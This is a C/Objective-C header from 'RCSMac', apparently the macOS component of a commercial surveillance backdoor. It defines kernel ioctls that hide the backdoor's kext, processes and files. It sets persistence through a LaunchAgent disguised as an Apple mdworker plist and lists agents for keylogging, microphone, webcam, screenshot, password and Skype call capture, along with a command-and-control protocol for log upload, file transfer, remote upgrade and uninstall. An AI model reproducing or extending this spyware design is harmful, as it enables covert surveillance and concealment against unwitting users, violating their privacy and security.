/*
 * RCSMac - RCSMCommon Header
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 08/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __Common_h__
#define __Common_h__

#import <CoreAudio/CoreAudio.h>
#import <sys/sysctl.h>
#import <stdbool.h>
#import <assert.h>
#import <errno.h>

#import <netdb.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <netinet/in.h>

#import "RCSMSharedMemory.h"
#import "RCSMUtils.h"

//#define DEMO_VERSION
//#define DEV_MODE
//#define DEBUG_LOG

#define INPUT_MANAGER_FOLDER @"appleHID"
#define OSAX_FOLDER @"appleOsax"
#define ME __func__


//
// Protocol definition for all the agents, they must conform to this
//
@protocol Agents

- (void)start;
- (BOOL)stop;
- (BOOL)resume;

@end

typedef struct kinfo_proc kinfo_proc;

extern RCSMSharedMemory  *gSharedMemoryCommand;
extern RCSMSharedMemory  *gSharedMemoryLogging;
extern RCSMUtils         *gUtil;
extern NSLock            *gSuidLock;
extern NSLock            *gControlFlagLock;

#pragma mark -
#pragma mark Code Not Used
#pragma mark -

#define invokeSupersequent(...) \
    ([self getImplementationOf:_cmd after:impOfCallingMethod(self, _cmd)]) \
    (self, _cmd, ##__VA_ARGS__)

#define invokeSupersequentNoParameters() \
    ([self getImplementationOf:_cmd after:impOfCallingMethod(self, _cmd)]) \
    (self, _cmd)

#pragma mark -
#pragma mark Kernel IOCTL stuff
#pragma mark -

#define MAX_USER_LENGTH   20
#define MAX_DIR_LENGTH    30
#define BDOR_DEVICE       "/dev/pfCPU"
#define MCHOOK_MAGIC      31338

#define KERNEL_BASE   0xffffff8000200000
#define SWAP_LONG(a) ( ((a) << 24) | \
                       (((a) << 8) & 0x00ff0000) | \
                       (((a) >> 8) & 0x0000ff00) | \
                       ((a) >> 24) )

// Used for the uspace<->kspace initialization
#define MCHOOK_INIT         _IOW(MCHOOK_MAGIC, 8978726, char [MAX_USER_LENGTH])
// Show kext from kextstat -- DEBUG
#define MCHOOK_SHOWK        _IO( MCHOOK_MAGIC, 8349871)
// Hide kext from kextstat
#define MCHOOK_HIDEK        _IO( MCHOOK_MAGIC, 4975738)
// Hide given pid
#define MCHOOK_HIDEP        _IOW(MCHOOK_MAGIC, 9400284, char [MAX_USER_LENGTH])
// Hide given dir/file name
#define MCHOOK_HIDED        _IOW(MCHOOK_MAGIC, 1998274, char [MAX_DIR_LENGTH])
// Show Process -- DEBUG
#define MCHOOK_SHOWP        _IO( MCHOOK_MAGIC, 6839840)
// Unregister userspace component
#define MCHOOK_UNREGISTER   _IOW(MCHOOK_MAGIC, 5739299, char [MAX_USER_LENGTH])
// Returns the number of active backdoors
#define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int)
// Pass symbols resolved from uspace to kspace (not exported symbol snow)
#define MCHOOK_SOLVE_SYM    _IOW(MCHOOK_MAGIC, 6483647, struct symbols)
// Tell the kext to find sysent
#define MCHOOK_FIND_SYS     _IOW(MCHOOK_MAGIC, 4548874, struct os_version)

typedef struct symbols {
  uint32_t hash;
  uint32_t symbol;
} symbol_t;

typedef struct os_version {
  uint32_t major;
  uint32_t minor;
  uint32_t bugfix;
} os_version_t;

#pragma mark -
#pragma mark General Parameters
#pragma mark -

#define BACKDOOR_DAEMON_PLIST @"Library/LaunchAgents/com.apple.mdworker.plist"
#define SLI_PLIST @"/Library/Preferences/com.apple.SystemLoginItems.plist"
 
#define LOG_PREFIX    @"LOGF"
#define LOG_EXTENSION @".log"

#define SSL_FIRST_COMMAND @".NEWPROTO"

// unixEpoch - winEpoch stuff
#define EPOCH_DIFF 0x019DB1DED53E8000LL /* 116444736000000000 nsecs */
#define RATE_DIFF  10000000             /* 100 nsecs */

// Max size of the exchanged app name through SHMem
#define MAXIDENTIFIERLENGTH 22

// Max seconds to wait for an agent/event stop
#define MAX_STOP_WAIT_TIME 5

// Max seconds to wait for an action to trigger (e.g. waiting for a sync end)
#define MAX_ACTION_WAIT_TIME 60

// Encryption key length
#define KEY_LEN 128

// Size of the first 2 DWORDs that we need to skip in the configuration file
#define TIMESTAMP_SIZE sizeof(int) * 2

#define SHMEM_COMMAND_MAX_SIZE  0x3000
#define SHMEM_LOG_MAX_SIZE      0x300000
#define SHMEM_SEM_NAME          @"sem-mdworker"

// Hooked external apps Identifier
#define SKYPE @"com.skype.skype"
#define ADIUM @"com.adiumX.adiumX"
#define YAHOO @"com.yahoo.messenger3"

#define NEWCONF @"new_juice.mac"

#pragma mark -
#pragma mark Backdoor Configuration
#pragma mark -

// Available modes for our backdoor
#define SLIPLIST @"Ah56K"
#define UISPOOF  @"Ah57K"
#define DYLIB    @"Ah58K"
#define DEV      @"Ah59K"

//
// Agents
//
#define AGENT_FILECAPTURE 0x0000
#define AGENT_KEYLOG      0x0040
#define AGENT_PRINTER     0x0100
#define AGENT_VOIP        0x0140
#define AGENT_URL         0x0180
#define AGENT_ORGANIZER   0x0200
#define AGENT_DEVICE      0x0240
#define AGENT_MOUSE       0x0280
#define AGENT_EMAIL       0x1001
#define AGENT_SCREENSHOT  0xB9B9
#define AGENT_MICROPHONE  0xC2C2
#define AGENT_CHAT        0xC6C6
#define AGENT_CRISIS      0xC9C9
#define AGENT_CLIPBOARD   0xD9D9
#define AGENT_CAM         0xE9E9
#define AGENT_PASSWORD    0xFAFA

//
// Agents Shared Memory offsets
//
#define OFFT_KEYLOG       0x0040
#define OFFT_PRINTER      0x0440
#define OFFT_VOIP         0x0840
#define OFFT_URL          0x0C40
#define OFFT_MOUSE        0x1040
#define OFFT_MICROPHONE   0x1440
#define OFFT_IM           0x1840
#define OFFT_CLIPBOARD    0x1C40
#define OFFT_COMMAND      0x2040

extern u_int remoteAgents[];

//
// Events
//
#define EVENT_TIMER       0x0000
#define EVENT_PROCESS     0x0001
#define EVENT_CONNECTION  0x0002
#define EVENT_SCREENSAVER 0x0003
#define EVENT_SYSLOG      0x0004
#define EVENT_QUOTA       0x0005
// NEW - TODO
//#define EVENT_LOCKSCREEN  (uint)0x000x

//
// Actions
//
#define ACTION_SYNC         0x0001
#define ACTION_AGENT_START  0x0002
#define ACTION_AGENT_STOP   0x0003
#define ACTION_EXECUTE      0x0004
#define ACTION_UNINSTALL    0x0005

// Configuration file Tags
#define EVENT_CONF_DELIMITER "EVENTCONFS-"
#define AGENT_CONF_DELIMITER "AGENTCONFS-"
#define LOGRP_CONF_DELIMITER "LOGRPCONFS-"
#define BYPAS_CONF_DELIMITER "BYPASCONFS-"
#define ENDOF_CONF_DELIMITER "ENDOFCONFS-"

// Agent Status
#define AGENT_DISABLED    @"DISABLED"
#define AGENT_ENABLED     @"ENABLED"
#define AGENT_RUNNING     @"RUNNING"
#define AGENT_STOPPED     @"STOPPED"

// Monitor Status
#define EVENT_RUNNING     @"RUNNING"
#define EVENT_STOPPED     @"STOPPED"

// Agent Commands
#define AGENT_START       @"START"
#define AGENT_STOP        @"STOP"
#define AGENT_RELOAD      @"RELOAD"

// Monitor Commands
#define EVENT_START       @"START"
#define EVENT_STOP        @"STOP"

// Actions status
#define ACTION_STANDBY    0
#define ACTION_PERFORMING 1

#pragma mark -
#pragma mark Events/Actions/Agents Parameters
#pragma mark -

// Agents configuration
#define CONF_ACTION_NULL        0xFFFFFFFF

#define TIMER_AFTER_STARTUP     0x0
#define TIMER_LOOP              0x1
#define TIMER_DATE              0x2
#define TIMER_DELTA             0x3

#pragma mark -
#pragma mark Transfer Protocol Definition
#pragma mark -

// Transfer Protocol Parameters
#define PROTO_INVALID     0x00
#define PROTO_OK          0x01
#define PROTO_NO          0x02  // Command failed
#define PROTO_BYE         0x03  // Closing connection
#define PROTO_CHALLENGE   0x04  // Challenge, need to encrypt 16 bytes
#define PROTO_RESPONSE    0x05  // Response, 16 bytes encrypted
#define PROTO_SYNC        0x06  // Send Logs
#define PROTO_NEW_CONF    0x07  // New configuration available big "nBytes"
#define PROTO_LOG_NUM     0x08  // Gonna send "nLogs"
#define PROTO_LOG         0x09  // Log big "nBytes"
#define PROTO_UNINSTALL   0x0A  // Uninstall
#define PROTO_RESUME      0x0B  // Send me back log "name" starting from "xByte"
#define PROTO_DOWNLOAD    0x0C  // Download - send me file "name" (wchar)
#define PROTO_UPLOAD      0x0D  // Upload - upload file "nane" big "nBytes" to "pathName"
#define PROTO_FILE        0x0E  // Gonna receive a "fileName" big "nBytes"
#define PROTO_ID          0x0F  // Backdoor ID
#define PROTO_INSTANCE    0x10  // Device ID
#define PROTO_USERID      0x11  // IMSI/USERNAME,# unpadded bytes (sent block is padded though)
#define PROTO_DEVICEID    0x12  // IMEI/HOSTNAME,# unpadded bytes (sent block is padded though)
#define PROTO_SOURCEID    0x13  // Not used on MacOS
#define PROTO_VERSION     0x14  // Backdoor version (10 byte)
#define PROTO_LOG_END     0x15  // LogSend did finish
#define PROTO_UPGRADE     0x16  // Upgrade tag
#define PROTO_ENDFILE     0x17  // End of Transmission - file download
#define PROTO_SUBTYPE     0x18  // Specifies the backdoor subtype

#pragma mark -
#pragma mark Log Types
#pragma mark -

#define LOG_DOWNLOAD      0xD0D0

#pragma mark -
#pragma mark Configurator Struct Definition
#pragma mark -

//
// Definitions of all the struct filled in by the Configurator
//
typedef struct _configuration {
  u_int confID;
  u_int internalDataSize;
  NSData *internalData;
} configurationStruct;

typedef struct _agent {
  u_int   agentID;
  u_int   status;  // Running, Stopped
  u_int   internalDataSize;
  //void *pParams;
  NSData  *internalData;
  void    *pFunc;        // Thread start routine
  u_int   command;
} agentStruct;

typedef struct _event {
  u_int   type;
  u_int   actionID;
  u_int   internalDataSize;
  NSData  *internalData;
  void    *pFunc;
  u_int   status;
  u_int   command;     // Used for communicate within the monitor
} eventStruct;

typedef struct _action {
  u_int   type;
  u_int   internalDataSize;
  NSData  *internalData;
} actionStruct;

typedef struct _actionContainer {
  u_int numberOfSubActions;
} actionContainerStruct;

typedef struct _eventConf {
  u_int   numberOfEvents;
  NSData  *internalData;
} eventConfStruct;

#pragma mark -
#pragma mark Events Data Struct Definition
#pragma mark -

//
// struct for events data
//
typedef struct _timer {
  u_int type;
  u_int loDelay;
  u_int hiDelay;
} timerStruct;

typedef struct _process {
  u_int onClose;
  u_int lookForTitle; // 1 for Title - 0 for Process Name
  char name[256];
} processStruct;

typedef struct _connection {
  u_long ipAddress;
  u_long netMask;
  u_int port;
} connectionStruct;

#pragma mark -
#pragma mark Actions Data Struct Definition
#pragma mark -

typedef struct _sync {
  u_int minSleepTime;
  u_int maxSleepTime;
  u_int bandwidthLimit;
  char  configString[256]; // ???
} syncStruct;

#pragma mark -
#pragma mark Agents Data Struct Definition
#pragma mark -

typedef struct _screenshot {
  u_int sleepTime;
  u_int dwTag;
  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
  u_int grabNewWindows; // 1 TRUE onNewWindow - 0 FALSE
} screenshotStruct;

// Massimo Chiodini - 05/08/2009
typedef struct _webcam {
  u_int sleepTime;
  u_int numOfFrame; // 1 Window - 0 Entire Desktop
} webcamStruct;
// End of Chiodo

typedef struct _logDownload {
  u_int version;
#define LOG_FILE_VERSION 2008122901
  u_int fileNameLength;
} logDownloadStruct;

typedef struct _mouseConfiguration {
  u_int width;
  u_int height;
} mouseStruct;

typedef struct _voipConfiguration {
  u_int sampleSize;   // Max single-sample size
  u_int compression;  // Compression factor
} voipStruct;

#pragma mark -
#pragma mark Log File Header Struct Definition
#pragma mark -

//
// First DWORD is not encrypted and specifies: sizeof(logStruct) + deviceIdLen + 
// userIdLen + sourceIdLen + uAdditionalData
//
typedef struct _log {
  u_int version;
#define LOG_VERSION   2008121901
  u_int type;
  u_int hiTimestamp;
  u_int loTimestamp;
  u_int deviceIdLength;       // IMEI/Hostname len
  u_int userIdLength;         // IMSI/Username len
  u_int sourceIdLength;       // Caller Number / IP length
  u_int additionalDataLength; // Size of additional data if present
} logStruct;

#pragma mark -
#pragma mark Agents Additional Header
#pragma mark -

typedef struct _screenshotHeader {
	u_int version;
#define LOG_SCREENSHOT_VERSION 2009031201
	u_int processNameLength;
	u_int windowNameLength;
} screenshotAdditionalStruct;

#pragma pack(2)

typedef struct _keylogAdditionalHeader {
  short zero;
  struct tm timeStamp;
  char processName[128];
  char windowTitle[128];
  u_int delimeter;
#define DELIMETER 0xABADC0DE
  char contents[32];
} keylogEntryHeader;

typedef struct _mouseAdditionalHeader {
  u_int version;
#define LOG_MOUSE_VERSION 2009040201
  u_int processNameLength;
  u_int windowNameLength;
  u_int x;
  u_int y;
  u_int xMax;
  u_int yMax;
} mouseAdditionalStruct;

typedef struct _voipAdditionalHeader {
  u_int version;
#define LOG_VOIP_VERSION 2008121901
  u_int channel;            // 0 Mic - 1 Speaker
#define CHANNEL_MICROPHONE 0
#define CHANNEL_SPEAKERS   1
  u_int programType;        // VOIP_SKYPE
#define VOIP_SKYPE 1
#define VOIP_GTALK 2
#define VOIP_YAHOO 3
#define VOIP_MSMSG 4
#define VOIP_MOBIL 5
#define VOIP_SKWSA 6
  u_int sampleRate;
  u_int isIngoing;          // Not used as of now (0)
  u_int loStartTimestamp;
  u_int hiStartTimestamp;
  u_int loStopTimestamp;
  u_int hiStopTimestamp;
  u_int localPeerLength;    // Not used as of now (0)
  u_int remotePeerLength;   // Remote peer name length followed by the string
} voipAdditionalStruct;

#define SAMPLE_RATE_DEFAULT 48000
#define SAMPLE_RATE_SKYPE   48000
#define SAMPLE_RATE_GTALK   48000
#define SAMPLE_RATE_YMSG    48000
#define SAMPLE_RATE_MSN     16000

typedef struct _organizerAdditionalHeader{
  u_int size;
  u_int version;
  u_int identifier;
} organizerAdditionalHeader;

enum contactType {
  FirstName                 = 0x1,
  LastName                  = 0x2,
  CompanyName               = 0x3,
  BusinessFaxNumber         = 0x4,
  Department                = 0x5,
  Email1Address             = 0x6,
  MobileTelephoneNumber     = 0x7,
  OfficeLocation            = 0x8, 
  PagerNumber               = 0x9,
  BusinessTelephoneNumber   = 0xA,
  JobTitle                  = 0xB,
  HomeTelephoneNumber       = 0xC,
  Email2Address             = 0xD,
  Spouse                    = 0xE,
  Email3Address             = 0xF,
  Home2TelephoneNumber      = 0x10,
  HomeFaxNumber             = 0x11,
  CarTelephoneNumber        = 0x12,
  AssistantName             = 0x13,
  AssistantTelephoneNumber  = 0x14,
  Children                  = 0x15,
  Categories                = 0x16,
  WebPage                   = 0x17,
  Business2TelephoneNumber  = 0x18,
  RadioTelephoneNumber      = 0x19,
  FileAs                    = 0x1A,
  YomiCompanyName           = 0x1B,
  YomiFirstName             = 0x1C,
  YomiLastName              = 0x1D,
  Title                     = 0x1E,
  MiddleName                = 0x1F,
  Suffix                    = 0x20,
  HomeAddressStreet         = 0x21,
  HomeAddressCity           = 0x22,
  HomeAddressState          = 0x23,
  HomeAddressPostalCode     = 0x24,
  HomeAddressCountry        = 0x25,
  OtherAddressStreet        = 0x26,
  OtherAddressCity          = 0x27,
  OtherAddressPostalCode    = 0x28,
  OtherAddressCountry       = 0x29,
  BusinessAddressStreet     = 0x2A,
  BusinessAddressCity       = 0x2B,
  BusinessAddressState      = 0x2C, 
  BusinessAddressPostalCode = 0x2D,
  BusinessAddressCountry    = 0x2E,
  OtherAddressState         = 0x2F,
  Body                      = 0x30,
  // Birthday & Anniversary are string (wchar) converted FILETIME struct
  Birthday                  = 0x31,
  Anniversary               = 0x32
};

#pragma pack(2)

typedef struct _waveFormat
{
  short         formatTag;          /* format type */
  short         nChannels;          /* number of channels (i.e. mono, stereo...) */
  u_int         nSamplesPerSec;     /* sample rate */
  u_int         nAvgBytesPerSec;    /* for buffer estimation */
  short         blockAlign;         /* block size of data */
  short         bitsPerSample;      /* number of bits per sample of mono data */
  //short         size;               /* the count in bytes of the size of */
} waveHeader;

#pragma mark -
#pragma mark Shared Memory communication protocol
#pragma mark -

// Component ID - aka who is reading/writing from Shared Memory
#define COMP_CORE  0x0
#define COMP_AGENT 0x1

typedef struct _shMemoryCommand {
  u_int agentID;                  // agentID
  u_int direction;                // 0 - FromAgentToCore | 1 - FromCoreToAgent
#define D_TO_CORE                 0x0
#define D_TO_AGENT                0x1
  u_int command;                  // 0 - LogData | 1 - StartAgent | 2 - StopAgent
#define AG_LOGDATA                0x0
#define AG_START                  0x1
#define AG_STOP                   0x2
#define CR_REGISTER_SYNC_SAFARI   0x3 // Request from core (want to sync)
#define IM_CAN_SYNC_SAFARI        0x4 // Reply from IM (can sync with)
#define CR_UNREGISTER_SAFARI_SYNC 0x5 // Unregister the sync operation
#define IM_SYNC_DONE              0x6 // Sync ended
  char commandData[0x3F0];
  u_int commandDataSize;
} shMemoryCommand;

// size: 0x2710 - 10K
typedef struct _shMemoryLog {
  u_int status;                       // 0 - free | 1 - Is Writing | 2 - Written
#define SHMEM_FREE                0x0
#define SHMEM_LOCKED              0x1
#define SHMEM_WRITTEN             0x2
  u_int agentID;                      // agentID
  u_int direction;                    // 0 - FromAgentToCore | 1 - FromCoreToAgent
  u_int commandType;
#define CM_NO_COMMAND             0x00000000
#define CM_CREATE_LOG_HEADER      0x00000001
#define CM_UPDATE_LOG_HEADER      0x00000002
#define CM_AGENT_CONF             0x00000004
#define CM_LOG_DATA               0x00000008
#define CM_CLOSE_LOG              0x00000010
#define CM_CLOSE_LOG_WITH_HEADER  0x00000020
  time_t timestamp;                   // timestamp used for ordering
#ifdef __i386__
  u_int dummy;
#endif
  u_int flag;                         // Per-Agent flag
  u_int commandDataSize;              // Size of the command Data
#define MAX_COMMAND_DATA_SIZE 0x26fc  // old value = 980, now = 9980
  char commandData[MAX_COMMAND_DATA_SIZE];
} shMemoryLog;

#pragma mark -
#pragma mark SharedMemory flags
#pragma mark -

#define FLAG_MORE_DATA            0x00000001

#define SKYPE_CHANNEL_INPUT       0x00000002
#define SKYPE_CHANNEL_OUTPUT      0x00000004
#define SKYPE_CLOSE_CALL          0x00000008

//
// Global variables required by the backdoor
//
extern char     gLogAesKey[];
extern char     gConfAesKey[];
extern char     gInstanceId[];
extern char     gBackdoorID[];
extern char     gChallenge[];
extern u_int    gVersion;
extern u_int    gSkypeQuality;
extern char     gMode[];

extern NSString *gBackdoorName;
extern NSString *gBackdoorUpdateName;
extern NSString *gConfigurationName;
extern NSString *gConfigurationUpdateName;
extern NSString *gInputManagerName;
extern NSString *gKextName;

// OS version
extern u_int gOSMajor;
extern u_int gOSMinor;
extern u_int gOSBugFix;

enum
{
  kErrorUnknown = -1,
};

#pragma mark -
#pragma mark Methods definition
#pragma mark -

#pragma mark Process routines

int getBSDProcessList       (kinfo_proc **procList, size_t *procCount);
NSArray *obtainProcessList  ();
BOOL findProcessWithName    (NSString *aProcess);
NSNumber *pidForProcessName (NSString *aProcess);

#pragma mark -
#pragma mark Unused

IMP impOfCallingMethod (id lookupObject, SEL selector);

#pragma mark -
#pragma mark Networking routines

BOOL isAddressOnLan (struct in_addr ipAddress);
BOOL isAddressAlreadyDetected (NSString *ipAddress,
                               int aPort,
                               NSString *netMask,
                               NSMutableArray *ipDetectedList);
BOOL compareIpAddress(struct in_addr firstIp,
                      struct in_addr secondIp,
                      u_long netMask);

NSString *getHostname();

void getSystemSerialNumber(CFStringRef *serialNumber);

int matchPattern(const char *source, const char *pattern);
NSArray *searchForProtoUpload(NSString *aFileMask);
NSArray *searchFile(NSString *aFileMask);

static unsigned int sdbm (unsigned char *str);
unsigned int findSymbolInFatBinary (void *imageBase,
                                    unsigned int symbolHash);

#ifdef DEBUG_COMMON
void printFormatFlags(AudioStreamBasicDescription inDescription);
#endif

size_t _utf16len(unichar *string);

#ifdef DEBUG_LOG
void debugLog(const char *callerMethod, NSString *format, ...);
void warnLog(const char *callerMethod, NSString *format, ...);
void infoLog(const char *callerMethod, NSString *format, ...);
void errorLog(const char *callerMethod, NSString *format, ...);
#endif

#ifdef DEMO_VERSION
void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
#endif

#endif